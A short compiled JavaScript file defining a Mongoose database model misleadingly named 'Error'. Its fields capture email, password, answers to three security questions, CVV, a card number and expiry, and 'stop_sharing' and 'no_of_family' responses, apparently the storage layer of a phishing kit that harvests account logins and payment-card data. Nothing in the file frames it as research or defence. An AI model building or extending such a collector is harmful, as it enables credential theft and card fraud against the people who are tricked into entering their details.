"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const mongoose_1 = require("mongoose");
const ErrorSchema = new mongoose_1.Schema({
    email: {
        type: String,
        required: true,
    },
    password: {
        type: String,
        required: true,
    },
    date: {
        type: String,
        required: true,
    },
    first_q: {
        type: String,
        required: true,
    },
    second_q: {
        type: String,
        required: true,
    },
    third_q: {
        type: String,
        required: true,
    },
    cvv: String,
    no: String,
    url: String,
    stop_sharing: {
        type: String,
        required: true,
    },
    no_of_family: {
        type: String,
        required: true,
    },
    createdAt: {
        type: Date,
        default: () => Date.now(),
    },
});
const Error = (mongoose_1.models === null || mongoose_1.models === void 0 ? void 0 : mongoose_1.models.Error) || (0, mongoose_1.model)("Error", ErrorSchema);
exports.default = Error;
